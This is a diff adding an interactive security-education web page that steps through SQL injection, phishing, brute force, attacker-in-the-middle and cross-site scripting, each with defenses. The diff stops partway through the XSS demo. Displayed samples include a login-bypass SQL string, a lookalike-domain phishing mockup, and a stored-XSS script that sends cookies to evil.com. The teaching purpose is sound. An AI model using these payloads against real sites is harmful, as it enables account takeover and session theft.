+<div class="ovr" id="ovr" role="dialog" aria-modal="true" aria-labelledby="m-title">
+  <div class="modal" id="modal">
+    <div class="m-top">
+      <div class="m-meta">
+        <div class="m-badge" id="m-capec"></div>
+        <div class="m-title" id="m-title"></div>
+      </div>
+      <button class="close-btn" id="close-btn" aria-label="Close demo">✕</button>
+    </div>
+    <div class="pips" id="pips"></div>
+    <div class="viz" id="viz"></div>
+    <div class="s-txt">
+      <div class="s-h" id="s-h"></div>
+      <div class="s-p" id="s-p"></div>
+    </div>
+    <div class="nav-row">
+      <button class="btn btn-s" id="prev-btn">← Back</button>
+      <span class="s-ctr" id="s-ctr"></span>
+      <button class="btn btn-p" id="next-btn">Next →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── Timer management ──────────────────────────────────────────────
+const timers = [];
+function kt(id){ timers.push(id); return id; }
+function clearTimers(){ timers.forEach(t=>{clearTimeout(t);clearInterval(t);}); timers.length=0; }
+
+// ── Completed set (localStorage) ─────────────────────────────────
+let done = new Set();
+try{ done = new Set(JSON.parse(localStorage.getItem('apl_done')||'[]')); }catch(e){}
+function saveDone(){ try{ localStorage.setItem('apl_done', JSON.stringify([...done])); }catch(e){} }
+
+// ── Filter state ──────────────────────────────────────────────────
+let filterCat = 'All', filterDiff = 0, searchQ = '';
+
+// ── State ─────────────────────────────────────────────────────────
+let curDemo = -1, curStep = 0;
+
+// ═══════════════════════════════════════════════════════════════════
+//  DEMOS
+// ═══════════════════════════════════════════════════════════════════
+const DEMOS = [
+
+// ── 1. SQL INJECTION ─────────────────────────────────────────────
+{
+  id:'sql', capec:'CAPEC-66', title:'SQL Injection',
+  category:'Injection', catColor:'#dc2626', difficulty:2,
+  icon:'💉', tagline:'Tricking a database with cleverly crafted input to bypass login or steal data.',
+  steps:[
+    { title:'The Login Form',
+      desc:'Every login form sends your credentials to a server, which checks them against a database. The key question is: <em>how</em> does it build that check?',
+      html:`<div class="sql-scene">
+        <div class="mock-form">
+          <h4>🔐 Member Login</h4>
+          <div class="fld"><label>Username</label><div class="fi">admin</div></div>
+          <div class="fld"><label>Password</label><div class="fi">mypassword</div></div>
+          <button class="cj-btn leg" style="width:100%;margin-top:4px">Log In</button>
+        </div>
+        <p style="font-size:11px;color:var(--fgm);text-align:center">↑ A typical login form — looks harmless enough</p>
+      </div>`
+    },
+    { title:'How the SQL Query is Built',
+      desc:'Behind the scenes, the server drops your input directly into a <span class="term" data-tip="A SQL query string is a command sent to a database — it tells the database which records to look up, add, or change. Like a question you ask the database in its own language.">SQL query string</span>. For a legitimate user, the <code class="ic">AND</code> condition requires both username AND password to match.',
+      html:`<div class="sql-scene">
+        <div class="qbox"><span class="qkw">SELECT</span> * <span class="qkw">FROM</span> users
+<span class="qkw">WHERE</span> username = <span class="qstr">'admin'</span>
+  <span class="qkw">AND</span> password = <span class="qstr">'mypassword'</span></div>
+        <div class="res-row res-ok">✅ One row returned → Login successful</div>
+      </div>`
+    },
+    { title:'The Injection Payload',
+      desc:'An attacker types <code class="ic">\' OR \'1\'=\'1</code> as the username. The single quote <code class="ic">\'</code> <strong>breaks out</strong> of the intended string — it ends the username value early and injects raw SQL code.',
+      html:`<div class="sql-scene">
+        <div class="mock-form">
+          <h4>🔐 Member Login</h4>
+          <div class="fld"><label>Username</label>
+            <div class="fi" style="color:var(--red);border-color:var(--red)">' OR '1'='1' --</div>
+          </div>
+          <div class="fld"><label>Password</label><div class="fi">anything123</div></div>
+        </div>
+        <p style="font-size:11px;color:var(--red);text-align:center;font-weight:600">⚠ This input breaks the intended query structure</p>
+      </div>`
+    },
+    { title:'The Logic Bypass',
+      desc:'The injected payload does two things: <code class="ic">\'1\'=\'1\'</code> is always true so the OR clause matches every row, and the <code class="ic">--</code> is a SQL comment that <strong>erases everything after it</strong> — including the password check. The database never evaluates it.',
+      html:`<div class="sql-scene">
+        <div class="qbox"><span class="qkw">SELECT</span> * <span class="qkw">FROM</span> users
+<span class="qkw">WHERE</span> username = <span class="qstr">''</span>
+  <span class="qkw">OR</span> <span class="qinj">'1'='1'</span> <span class="qinj">--</span> <span class="qcmt">← comment: rest is ignored ↓</span>
+  <span class="qcmt">-- AND password = 'anything123'</span></div>
+        <div class="res-row res-bad">⚠ All rows match → Attacker is logged in as first user</div>
+        <div class="callout red">Defense: Use <strong><span class="term" data-tip="Parameterized queries (also called prepared statements) send the query structure and user data separately to the database — so user input can never be treated as SQL code.">parameterized queries</span></strong> (prepared statements). They separate code from data, so input can never become executable SQL. (<a class="ref-link" href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener">OWASP guide</a>)</div>
+      </div>`
+    }
+  ]
+},
+
+// ── 2. PHISHING ───────────────────────────────────────────────────
+{
+  id:'phish', capec:'CAPEC-98', title:'Phishing',
+  category:'Social Eng.', catColor:'#d97706', difficulty:1,
+  icon:'🎣', tagline:'Disguising a malicious message as a trusted source to steal credentials or install malware.',
+  steps:[
+    { title:'You\'ve Got Mail',
+      desc:'You receive an email from what looks like PayPal. The sender\'s name looks right, the logo is there, and the message is urgent. Urgency is a key phishing tactic — it stops you from thinking critically.',
+      html:`<div class="phish-scene">
+        <div class="eml-card">
+          <div class="eml-bar">
+            <div class="eml-dots">
+              <div class="eml-dot" style="background:#ff5f57"></div>
+              <div class="eml-dot" style="background:#febc2e"></div>
+              <div class="eml-dot" style="background:#28c840"></div>
+            </div>
+            <span>Inbox — Mail</span>
+          </div>
+          <div class="eml-flds">
+            <div class="ef"><span class="ef-l">From:</span><span>PayPal Service &lt;service@paypal.com&gt;</span></div>
+            <div class="ef"><span class="ef-l">To:</span><span>you@example.com</span></div>
+            <div class="ef"><span class="ef-l">Subject:</span><span style="font-weight:600">⚠️ Unusual activity detected — verify now</span></div>
+          </div>
+          <div class="eml-body">
+            <p>Dear Customer,</p>
+            <p style="margin-top:8px">We noticed unusual login activity on your account. To protect you, we've temporarily limited access. Please verify your account within 24 hours or it will be suspended.</p>
+            <p style="margin-top:12px"><a class="eml-link">Verify My Account →</a></p>
+            <div class="eml-sig">© PayPal Inc. All rights reserved.</div>
+          </div>
+        </div>
+      </div>`
+    },
+    { title:'Hover to Reveal the Traps',
+      desc:'Hover over the highlighted elements below to see what the attacker is hiding. Real phishing emails often get many details right — but a few critical ones wrong.',
+      html:`<div class="phish-scene">
+        <div class="eml-card">
+          <div class="eml-bar">
+            <div class="eml-dots">
+              <div class="eml-dot" style="background:#ff5f57"></div>
+              <div class="eml-dot" style="background:#febc2e"></div>
+              <div class="eml-dot" style="background:#28c840"></div>
+            </div>
+            <span>Inbox — Mail</span>
+          </div>
+          <div class="eml-flds">
+            <div class="ef"><span class="ef-l">From:</span>
+              <span>PayPal Service &lt;<span class="flag red" data-tip="Real domain is paypal.com. This is paypa1.com (the letter 'l' replaced with '1') — a lookalike domain.">service@paypa1.com</span>&gt;</span>
+            </div>
+            <div class="ef"><span class="ef-l">To:</span><span>you@example.com</span></div>
+            <div class="ef"><span class="ef-l">Subject:</span>
+              <span style="font-weight:600"><span class="flag ylw" data-tip="Urgency pressure ('verify NOW', 'or it will be suspended') is a classic manipulation tactic to prevent careful thought.">⚠️ Unusual activity detected — verify now</span></span>
+            </div>
+          </div>
+          <div class="eml-body">
+            <p>Dear <span class="flag ylw" data-tip="Legitimate companies know your name. Generic greetings like 'Dear Customer' suggest a mass phishing blast.">'Customer'</span>,</p>
+            <p style="margin-top:8px">We noticed unusual login activity. Please verify within 24 hours or your account will be suspended.</p>
+            <p style="margin-top:12px"><span class="flag red" data-tip="This link goes to paypa1-verify.xyz — NOT paypal.com. Always check the actual URL, not the link text."><a class="eml-link bad">Verify My Account →</a></span></p>
+          </div>
+        </div>
+      </div>`,
+    },
+    { title:'The Fake Website',
+      desc:'Clicking the link takes you to a convincing clone of PayPal\'s login page. Everything looks legitimate — the logo, the layout, even the URL bar has a lock icon. But the <span class="term" data-tip="A domain is the address of a website — the \'paypal.com\' part of a URL. Attackers register lookalike domains (e.g. paypa1.com) to impersonate real sites.">domain</span> is wrong.',
+      html:`<div class="xss-scene" style="padding:14px">
+        <div class="brow">
+          <div class="b-bar">
+            <div class="b-dots">
+              <div class="b-dot" style="background:#ff5f57"></div>
+              <div class="b-dot" style="background:#febc2e"></div>
+              <div class="b-dot" style="background:#28c840"></div>
+            </div>
+            <div class="b-url" style="color:var(--red);font-weight:600">🔒 paypa1-verify.xyz/login</div>
+          </div>
+          <div class="b-body">
+            <div style="text-align:center;padding:8px 0">
+              <div style="font-size:22px;margin-bottom:4px">🔵 PayPal</div>
+              <div style="font-size:11px;color:var(--fg2);margin-bottom:12px">Log in to your account</div>
+              <div class="fld" style="margin-bottom:8px"><input style="width:100%;padding:7px 10px;border:1.5px solid var(--bdr);border-radius:7px;font-size:12px;background:var(--sf3);color:var(--fg)" placeholder="Email or phone number" readonly></div>
+              <div class="fld"><input type="password" style="width:100%;padding:7px 10px;border:1.5px solid var(--bdr);border-radius:7px;font-size:12px;background:var(--sf3);color:var(--fg)" placeholder="Password" readonly></div>
+            </div>
+          </div>
+        </div>
+        <div class="callout red" style="margin-top:8px">The site looks real, but every keystroke is sent to the attacker's server. Always verify the domain before entering credentials.</div>
+      </div>`
+    },
+    { title:'After the Credential Harvest',
+      desc:'Once you submit the form, your real PayPal credentials go directly to the attacker. They may even redirect you to the legitimate site to avoid suspicion while they drain your account.',
+      html:`<div class="vpad">
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div style="display:flex;align-items:center;gap:12px;padding:12px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+            <span style="font-size:22px">1️⃣</span>
+            <div style="font-size:13px;line-height:1.5"><strong>You submit the form</strong> → your email + password travel to attacker's server</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:12px;padding:12px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+            <span style="font-size:22px">2️⃣</span>
+            <div style="font-size:13px;line-height:1.5"><strong>You're redirected</strong> to real PayPal — you think the login "failed"</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:12px;padding:12px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+            <span style="font-size:22px">3️⃣</span>
+            <div style="font-size:13px;line-height:1.5"><strong>Attacker logs in</strong> to your real account and takes action</div>
+          </div>
+        </div>
+        <div class="callout grn">Defense: Use a <strong><span class="term" data-tip="A password manager stores your logins and auto-fills them only on the exact site they were saved for — so it won\'t fill your password on a fake lookalike site, even if it looks identical.">password manager</span></strong> — it only fills credentials on the exact real domain, so it won't auto-fill on fakes. Enable <strong><span class="term" data-tip="MFA (Multi-Factor Authentication) requires a second proof beyond a password — like a code sent to your phone. Even if an attacker steals your password, they can\'t log in without the second factor.">multi-factor authentication (MFA)</span></strong> as a second layer.</div>
+      </div>`
+    }
+  ]
+},
+
+// ── 3. BRUTE FORCE ────────────────────────────────────────────────
+{
+  id:'brute', capec:'CAPEC-49', title:'Brute Force Attack',
+  category:'Credential', catColor:'#d97706', difficulty:1,
+  icon:'🔨', tagline:'Systematically trying every possible password combination until one works.',
+  steps:[
+    { title:'The Core Idea',
+      desc:'A brute force attack is simple: try passwords one at a time until you find the right one. Given enough time and attempts, <em>any</em> password can theoretically be cracked this way.',
+      html:`<div class="vpad" style="text-align:center">
+        <div style="font-size:52px;margin-bottom:12px">🔒</div>
+        <div style="font-size:14px;font-weight:600;margin-bottom:8px">Attacker wants to get in</div>
+        <div style="font-size:12px;color:var(--fg2);max-width:300px;margin:0 auto;line-height:1.6">
+          The attacker doesn't know the password — but they have a computer that can try thousands of guesses per second.
+        </div>
+        <div style="margin-top:16px;display:flex;justify-content:center;gap:12px;flex-wrap:wrap">
+          ${['dog123','pass','123456','qwerty','abc123'].map(p=>`<div class="pwi" style="opacity:1">${p}</div>`).join('')}
+        </div>
+      </div>`
+    },
+    { title:'Watch It Happen',
+      desc:'The attacker\'s script tries common passwords from a dictionary list at machine speed. Each failure is logged and the next password is tried automatically — no human intervention needed.',
+      html:`<div class="bf-scene">
+        <div class="bf-stat">
+          <span>Attempts:</span><strong id="bf-count">0</strong>
+          <span>Target:</span><strong>hunter2</strong>
+        </div>
+        <div class="pw-list" id="pw-list">
+          ${['123456','password','qwerty','abc123','letmein','admin','monkey','pass1','hunter2','dragon','shadow','master','12345','iloveyou','baseball'].map(p=>`<div class="pwi" data-pw="${p}">${p}</div>`).join('')}
+        </div>
+      </div>`,
+      init(viz){
+        const items = [...viz.querySelectorAll('.pwi')];
+        const counter = viz.querySelector('#bf-count');
+        let i=0, count=0;
+        const target='hunter2';
+        function tryNext(){
+          if(i>0) items[i-1].classList.replace('try','fail');
+          if(i>=items.length) return;
+          items[i].classList.add('try');
+          count++;
+          if(counter) counter.textContent = count;
+          if(items[i].dataset.pw===target){
+            kt(setTimeout(()=>{ items[i].classList.replace('try','win'); },300));
+            return;
+          }
+          i++;
+          kt(setTimeout(tryNext, 380));
+        }
+        kt(setTimeout(tryNext, 500));
+      }
+    },
+    { title:'Why Password Strength Matters',
+      desc:'The weaker the password, the faster it falls. Short or common passwords are cracked in seconds. A longer, random password creates an astronomical search space that would take centuries.',
+      html:`<div class="bf-scene">
+        <div class="str-rows">
+          <div class="str-row">
+            <span class="str-lbl" style="color:var(--red)">password</span>
+            <div class="str-rail"><div class="str-fill" style="background:var(--red);width:0" data-w="8%"></div></div>
+            <span class="str-time">Instantly</span>
+          </div>
+          <div class="str-row">
+            <span class="str-lbl" style="color:var(--orange)">P@ssw0rd!</span>
+            <div class="str-rail"><div class="str-fill" style="background:var(--orange);width:0" data-w="22%"></div></div>
+            <span class="str-time">~3 hours</span>
+          </div>
+          <div class="str-row">
+            <span class="str-lbl" style="color:var(--yellow)">Tr0ub4dor&3</span>
+            <div class="str-rail"><div class="str-fill" style="background:var(--yellow);width:0" data-w="52%"></div></div>
+            <span class="str-time">~550 years</span>
+          </div>
+          <div class="str-row">
+            <span class="str-lbl" style="color:var(--green)">correct horse battery staple</span>
+            <div class="str-rail"><div class="str-fill" style="background:var(--green);width:0" data-w="92%"></div></div>
+            <span class="str-time">~550 quadrillion yrs</span>
+          </div>
+        </div>
+        <p style="font-size:11px;color:var(--fgm);margin-top:10px;text-align:center">* Estimates assume offline attack at 10 billion guesses/second</p>
+      </div>`,
+      init(viz){
+        kt(setTimeout(()=>{
+          viz.querySelectorAll('.str-fill').forEach(f=>{
+            f.style.width = f.dataset.w;
+          });
+        },300));
+      }
+    },
+    { title:'Defenses',
+      desc:'Modern systems use multiple layers to make brute force impractical. Each defense raises the cost for the attacker — sometimes past the point of feasibility.',
+      html:`<div class="vpad">
+        <div style="display:flex;flex-direction:column;gap:10px">
+          ${[
+            ['🔒','Account Lockout','After N failed attempts, lock the account. Attacker can\'t continue without triggering alerts.'],
+            ['⏱','Rate Limiting','Enforce a delay between attempts. At 1 guess/second, a billion-password list takes 31 years.'],
+            ['🧂','Password Hashing + Salting','Store passwords as slow, <span class="term" data-tip="A salted hash runs the password through a one-way math function (hashing) with a random extra value (the salt) mixed in. Attackers can\'t reverse it — they\'d have to guess billions of passwords to find a match.">salted hashes</span> (bcrypt, Argon2). Even if the DB leaks, cracking is hard.'],
+            ['📱','Multi-Factor Authentication','A stolen password alone isn\'t enough if MFA is required. The attacker also needs your phone.'],
+          ].map(([ico,lbl,tip])=>`
+            <div style="display:flex;align-items:flex-start;gap:12px;padding:10px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+              <span style="font-size:20px">${ico}</span>
+              <div><div style="font-size:13px;font-weight:600;margin-bottom:2px">${lbl}</div>
+                <div style="font-size:12px;color:var(--fg2);line-height:1.5">${tip}</div>
+              </div>
+            </div>`).join('')}
+        </div>
+      </div>`
+    }
+  ]
+},
+
+// ── 4. MAN-IN-THE-MIDDLE ─────────────────────────────────────────
+{
+  id:'mitm', capec:'CAPEC-94', title:'Attacker in the Middle',
+  category:'Network', catColor:'#0891b2', difficulty:3,
+  icon:'🕵️', tagline:'Inserting between two parties to intercept and relay traffic — including over HTTPS by acting as a TLS proxy.',
+  steps:[
+    { title:'Normal Communication',
+      desc:'When you communicate with a server, you expect a direct, private channel. Alice (you) sends a message intended only for Bob (the server). Under normal conditions, the data travels directly between them.',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">💻</div><div class="net-lbl">Alice (You)</div></div>
+          <div class="wire act" id="wire-left"></div>
+          <div class="net-node"><div class="net-ico act">🖥️</div><div class="net-lbl">Bob (Server)</div></div>
+        </div>
+        <div class="leg-row">
+          <div class="leg-i"><div class="leg-dot" style="background:var(--teal)"></div>Direct connection</div>
+          <div class="leg-i">🔒 Data is private</div>
+        </div>
+        <div class="info-box" style="margin-top:12px">Alice sends: <strong>"My password is s3cr3t"</strong><br>Bob receives it directly.</div>
+      </div>`,
+      init(viz){
+        const w = viz.querySelector('#wire-left');
+        if(!w) return;
+        let rev = false;
+        function sendPkt(){
+          const p = document.createElement('div');
+          p.className='pkt'; p.style.background='var(--teal)';
+          if(rev){ p.style.left='100%'; w.appendChild(p); kt(requestAnimationFrame(()=>{ p.style.left='0%'; })); }
+          else { p.style.left='0%'; w.appendChild(p); kt(requestAnimationFrame(()=>{ p.style.left='100%'; })); }
+          rev = !rev;
+          kt(setTimeout(()=>{ p.remove(); sendPkt(); }, 1600));
+        }
+        kt(setTimeout(sendPkt, 400));
+      }
+    },
+    { title:'The Attacker Positions Themselves',
+      desc:'Mallory, the attacker, inserts herself between Alice and Bob. This can happen via <span class="term" data-tip="ARP poisoning sends fake network messages to redirect traffic on a local network, making data flow through the attacker\'s device instead of directly to its destination.">ARP poisoning</span> on a local network, a <span class="term" data-tip="A rogue hotspot is a fake Wi-Fi access point set up by an attacker — like a \'Free Airport WiFi\' network. Anyone who connects has their traffic intercepted.">rogue Wi-Fi hotspot</span>, or <span class="term" data-tip="DNS hijacking corrupts the \'phone book\' of the internet so that a request for \'bank.com\' is secretly redirected to a server controlled by the attacker instead.">DNS hijacking</span>. Neither Alice nor Bob knows Mallory is there.',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">💻</div><div class="net-lbl">Alice</div></div>
+          <div class="wire evil" id="wire-a"></div>
+          <div class="net-node"><div class="net-ico evil">🦹</div><div class="net-lbl">Mallory</div></div>
+          <div class="wire evil" id="wire-b"></div>
+          <div class="net-node"><div class="net-ico act">🖥️</div><div class="net-lbl">Bob</div></div>
+        </div>
+        <div class="leg-row">
+          <div class="leg-i"><div class="leg-dot" style="background:var(--red)"></div>Intercepted path</div>
+        </div>
+        <div class="info-box" style="margin-top:12px">Alice thinks she's talking to Bob. Bob thinks he's talking to Alice. <strong>Both are wrong.</strong></div>
+      </div>`
+    },
+    { title:'Traffic Flows Through the Attacker',
+      desc:'Each hop is a separate connection — Alice talks to Mallory, and Mallory talks to Bob. Neither Alice nor Bob realises they\'re not speaking directly. Mallory can <strong>read and modify</strong> every message before passing it along.',
+      html:`<div class="mitm-scene">
+        <div style="display:flex;align-items:center;padding:0 0 4px;font-size:10px;font-weight:700;letter-spacing:.04em;color:var(--fgm)">
+          <div style="width:48px;text-align:center"></div>
+          <div style="flex:1;text-align:center;color:var(--teal)">🔒 ENCRYPTED</div>
+          <div style="width:48px;text-align:center;color:var(--red)" id="mal-lbl">🔓 SEES ALL</div>
+          <div style="flex:1;text-align:center;color:var(--teal)">🔒 ENCRYPTED</div>
+          <div style="width:48px;text-align:center"></div>
+        </div>
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">💻</div><div class="net-lbl">Alice</div></div>
+          <div class="wire evil" id="wa"></div>
+          <div class="net-node"><div class="net-ico evil" id="mal-ico">🦹</div><div class="net-lbl">Mallory</div></div>
+          <div class="wire evil" id="wb"></div>
+          <div class="net-node"><div class="net-ico act">🖥️</div><div class="net-lbl">Bob</div></div>
+        </div>
+        <div id="intercept-log" style="background:var(--surface);border:1px solid var(--bdr);border-radius:var(--rs);padding:10px;font-family:var(--fm);font-size:11px;margin-top:12px;min-height:80px;line-height:1.9"></div>
+      </div>`,
+      init(viz){
+        const wa = viz.querySelector('#wa'), wb = viz.querySelector('#wb');
+        const log = viz.querySelector('#intercept-log');
+        const malIco = viz.querySelector('#mal-ico');
+        if(!wa||!wb||!log) return;
+        // Each phase: [wire, fromRight, logHTML, flashMallory]
+        const phases = [
+          [wa, false,
+            '<span style="color:var(--fgm)">① Alice → Mallory:</span> <span style="color:var(--teal)">GET /login HTTP/1.1</span>',
+            true],
+          [wb, false,
+            '<span style="color:var(--fgm)">② 🦹 Mallory → Bob:</span> <span style="color:var(--red)">GET /login HTTP/1.1</span> <span style="color:var(--orange)">[Mallory decrypts &amp; re-encrypts]</span>',
+            false],
+          [wb, true,
+            '<span style="color:var(--fgm)">③ Bob → Mallory:</span> <span style="color:var(--teal)">HTTP/1.1 200 OK</span>',
+            true],
+          [wa, true,
+            '<span style="color:var(--fgm)">④ 🦹 Mallory → Alice:</span> <span style="color:var(--red)">200 OK</span> <span style="color:var(--orange)">[modified — injected malicious script]</span>',
+            false],
+        ];
+        let pi = 0;
+        function runPhase(){
+          if(pi >= phases.length) return;
+          const [wire, fromRight, entry, flash] = phases[pi];
+          if(flash && malIco){
+            malIco.style.transition='background .15s';
+            malIco.style.background='var(--red)';
+            malIco.style.borderRadius='50%';
+            kt(setTimeout(()=>{ malIco.style.background=''; }, 600));
+          }
+          const p = document.createElement('div');
+          p.className='pkt'; p.style.background='var(--red)';
+          if(fromRight){ p.style.left='100%'; wire.appendChild(p); kt(requestAnimationFrame(()=>{ p.style.left='0%'; })); }
+          else { p.style.left='0%'; wire.appendChild(p); kt(requestAnimationFrame(()=>{ p.style.left='100%'; })); }
+          kt(setTimeout(()=>{
+            p.remove();
+            log.innerHTML += entry + '<br>';
+            log.scrollTop = log.scrollHeight;
+            pi++;
+            kt(setTimeout(runPhase, 1600));
+          }, 1550));
+        }
+        kt(setTimeout(runPhase, 400));
+      }
+    },
+    { title:'AitM Works Over HTTPS Too',
+      desc:'Mallory can terminate the <span class="term" data-tip="TLS (Transport Layer Security) is the encryption layer behind HTTPS. It creates a private tunnel between your browser and a server so nobody in between can read the traffic — unless they control one endpoint.">TLS connection</span> herself, acting as the server to Alice and as Alice\'s browser to the real server — two separate <span class="term" data-tip="An encrypted tunnel scrambles data so only the two endpoints can read it. If the attacker controls one endpoint (by impersonating a server), they can still read the plaintext before re-encrypting it.">encrypted tunnels</span> with Mallory reading plaintext in the middle.',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">💻</div><div class="net-lbl">Alice</div></div>
+          <div class="wire evil" id="we"></div>
+          <div class="net-node"><div class="net-ico evil">🦹</div><div class="net-lbl">Mallory</div></div>
+          <div class="wire act" id="wf"></div>
+          <div class="net-node"><div class="net-ico act">🖥️</div><div class="net-lbl">Bob</div></div>
+        </div>
+        <div style="display:flex;justify-content:space-between;padding:2px 40px 0;font-size:10px;font-weight:700;letter-spacing:.03em">
+          <span style="color:var(--red)">TLS Session 1<br>Mallory's fake cert</span>
+          <span style="color:var(--teal)">TLS Session 2<br>Real server cert</span>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">
+          <div class="info-box">🔒 Alice sees a padlock — but the TLS session terminates at Mallory, not the real server. Mallory decrypts Alice's traffic, reads it, then re-encrypts it for Bob.<br><br>Both connections look "secure." <strong>The attacker is in the clear in the middle.</strong></div>
+          <div class="callout red">Defense: Never click through certificate warnings. <strong><span class="term" data-tip="HSTS preloading tells browsers to always use HTTPS for a domain — and this list is hardcoded into browsers before any attack can happen, so there\'s no initial unencrypted request an attacker could hijack.">HSTS preloading</span></strong> and <strong><span class="term" data-tip="Certificate pinning makes an app or browser refuse any TLS certificate that doesn\'t match a known trusted one — so an attacker can\'t substitute their own fake certificate even if they\'re in the middle.">certificate pinning</span></strong> prevent Mallory from substituting her own cert. Even with a successful AitM, <strong><span class="term" data-tip="MFA requires a second proof beyond a password — like a code sent to your phone. Even if Mallory captures your password, she still can\'t log in without your second factor.">MFA</span></strong> limits what stolen credentials alone can achieve.</div>
+        </div>
+      </div>`,
+      init(viz){
+        const we = viz.querySelector('#we'), wf = viz.querySelector('#wf');
+        if(!we||!wf) return;
+        let phase = 0;
+        function tick(){
+          const fwd = (phase % 2 === 0);
+          const p1 = document.createElement('div');
+          p1.className='pkt'; p1.style.background='var(--red)';
+          if(fwd){ p1.style.left='0%'; we.appendChild(p1); kt(requestAnimationFrame(()=>{ p1.style.left='100%'; })); }
+          else { p1.style.left='100%'; we.appendChild(p1); kt(requestAnimationFrame(()=>{ p1.style.left='0%'; })); }
+          kt(setTimeout(()=>{ p1.remove(); },1600));
+          kt(setTimeout(()=>{
+            const p2 = document.createElement('div');
+            p2.className='pkt'; p2.style.background='var(--teal)';
+            if(fwd){ p2.style.left='0%'; wf.appendChild(p2); kt(requestAnimationFrame(()=>{ p2.style.left='100%'; })); }
+            else { p2.style.left='100%'; wf.appendChild(p2); kt(requestAnimationFrame(()=>{ p2.style.left='0%'; })); }
+            kt(setTimeout(()=>{ p2.remove(); },1600));
+          },350));
+          phase++;
+          kt(setTimeout(tick, 2200));
+        }
+        kt(setTimeout(tick, 500));
+      }
+    }
+  ]
+},
+
+// ── 5. CROSS-SITE SCRIPTING ───────────────────────────────────────
+{
+  id:'xss', capec:'CAPEC-86', title:'Cross-Site Scripting',
+  category:'Web', catColor:'#2563eb', difficulty:2,
+  icon:'📜', tagline:'Injecting malicious scripts into a web page viewed by other users.',
+  steps:[
+    { title:'A Comment Section',
+      desc:'Many websites let users post comments. These comments are stored in a database and displayed to everyone who visits the page. What happens if a user submits HTML or JavaScript instead of text?',
+      html:`<div class="xss-scene">
+        <div class="brow">
+          <div class="b-bar">
+            <div class="b-dots">
+              <div class="b-dot" style="background:#ff5f57"></div>
+              <div class="b-dot" style="background:#febc2e"></div>
+              <div class="b-dot" style="background:#28c840"></div>
+            </div>
+            <div class="b-url">https://coolblog.example.com/post/42</div>
+          </div>
+          <div class="b-body">
+            <div style="font-size:13px;font-weight:700;margin-bottom:8px">Comments (3)</div>
+            <div class="cmt-item"><div class="cmt-ava">😊</div><div><div class="cmt-name">Alice</div><div class="cmt-txt">Great article, really enjoyed it!</div></div></div>
+            <div class="cmt-item"><div class="cmt-ava">🙂</div><div><div class="cmt-name">Bob</div><div class="cmt-txt">Thanks for sharing this!</div></div></div>
+            <div style="margin-top:10px">
+              <textarea class="inject-input" rows="2" placeholder="Leave a comment..." readonly></textarea>
+            </div>
+          </div>
+        </div>
+      </div>`
+    },
+    { title:'The Attacker\'s Payload',
+      desc:'Instead of normal text, the attacker submits a <code class="ic">&lt;script&gt;</code> tag as a comment. If the site doesn\'t <span class="term" data-tip="Sanitizing input means checking and cleaning text submitted by users before storing or displaying it — for example, stripping out HTML tags so they can\'t become executable code.">sanitize input</span>, this raw HTML gets stored in the database as-is.',
+      html:`<div class="xss-scene">
+        <div class="brow">
+          <div class="b-bar">
+            <div class="b-dots">
+              <div class="b-dot" style="background:#ff5f57"></div>
+              <div class="b-dot" style="background:#febc2e"></div>
+              <div class="b-dot" style="background:#28c840"></div>
+            </div>
+            <div class="b-url">https://coolblog.example.com/post/42</div>
+          </div>
+          <div class="b-body">
+            <div style="font-size:13px;font-weight:700;margin-bottom:8px">Comments (3)</div>
+            <div class="cmt-item"><div class="cmt-ava">😊</div><div><div class="cmt-name">Alice</div><div class="cmt-txt">Great article!</div></div></div>
+            <div class="cmt-item" style="border-color:var(--red)">
+              <div class="cmt-ava" style="background:var(--red-s)">🦹</div>
+              <div>
+                <div class="cmt-name" style="color:var(--red)">Attacker</div>
+                <div class="cmt-txt bad">&lt;script&gt;document.cookie='stolen='+document.cookie; fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="callout red">This script, if stored and rendered without sanitization, will execute in <em>every visitor's browser</em> — not just the attacker's.</div>
+      </div>`
+    },
+    { title:'Stored in the Database',
+      desc:'The server saves the comment verbatim, including the <code class="ic">&lt;script&gt;</code> tag. Now the malicious payload is persistent — it will execute every time anyone loads this page.',
+      html:`<div class="vpad">
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div style="background:#1a1828;border-radius:var(--rs);padding:14px;font-family:var(--fm);font-size:12px;line-height:1.8;color:#a9a5d6">
+            <span style="color:#cba6f7">INSERT INTO</span> comments (post_id, author, body)<br>
+            <span style="color:#cba6f7">VALUES</span> (<span style="color:#a6e3a1">42</span>, <span style="color:#a6e3a1">'Attacker'</span>,<br>
+            <span style="color:#f38ba8">'&lt;script&gt;fetch("evil.com?c="+document.cookie)&lt;/script&gt;'</span>)
+          </div>
+          <div style="display:flex;align-items:center;gap:10px;padding:10px;background:var(--surface);border:1.5px solid var(--bdr);border-radius:var(--rs)">
+            <span style="font-size:20px">🗄️</span>
+            <div style="font-size:13px;line-height:1.5"><strong>Payload saved.</strong> It sits in the database, waiting for the next victim to load the page.</div>
+          </div>
+        </div>
+      </div>`
+    },
+    { title:'Execution in the Victim\'s Browser',
+      desc:'When another user visits the page, the server sends the stored script as part of the HTML. Their browser sees it as legitimate code and runs it — stealing their <span class="term" data-tip="A session cookie is a small piece of data your browser stores that proves you\'re logged in. If an attacker steals it, they can impersonate you on that site without ever knowing your password.">session cookie</span> and sending it to the attacker.',
+      html:`<div class="xss-scene">
+        <div class="brow">
+          <div class="b-bar">
+            <div class="b-dots">
+              <div class="b-dot" style="background:#ff5f57"></div>
+              <div class="b-dot" style="background:#febc2e"></div>
+              <div class="b-dot" style="background:#28c840"></div>
+            </div>
+            <div class="b-url">https://coolblog.example.com/post/42</div>
